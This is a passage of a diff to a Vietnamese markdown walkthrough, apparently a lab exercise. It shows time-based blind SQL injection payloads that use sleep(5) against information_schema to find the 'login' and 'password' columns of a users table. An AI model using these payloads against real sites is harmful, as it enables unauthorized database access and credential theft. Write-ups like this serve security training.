@@ -168,11 +168,11 @@
 
      ![image](https://user-images.githubusercontent.com/101852647/163554833-df5d0e97-b945-4fb2-9a2c-7a0ea9372ee8.png)
 
- - Sau khi có được tên bảng cần khai thác thì bây giờ chúng ta sẽ tìm tên các cột có trong bảng đó bằng câu lệnh `’ AND (SELECT sleep(5) from information_schema.columns where column_name LIKE ‘%login%’ AND table_name=’users’)=1 #`.
+ - Sau khi có được tên bảng cần khai thác thì bây giờ chúng ta sẽ tìm tên các cột có trong bảng đó bằng câu lệnh `’ AND (SELECT sleep(5) from information_schema.columns where column_name LIKE ‘%login%’ AND table_name=’users’)=1 #`. Tên cột thứ 1 là: `login`
 
      ![image](https://user-images.githubusercontent.com/101852647/163555543-31c80995-442e-4120-a932-ff29a4f8699f.png)
 
- - Tương tự để tìm tên cột tiếp theo `’ AND (SELECT sleep(5) from information_schema.columns where column_name LIKE ‘%password%’ AND table_name=’users’)=1 #`
+ - Tương tự để tìm tên cột tiếp theo `’ AND (SELECT sleep(5) from information_schema.columns where column_name LIKE ‘%password%’ AND table_name=’users’)=1 #`. Tên cột thứ 2 là `password`
 
      ![image](https://user-images.githubusercontent.com/101852647/163555700-d7f65b34-59b2-43bb-9fdb-938495ecb3c6.png)
  
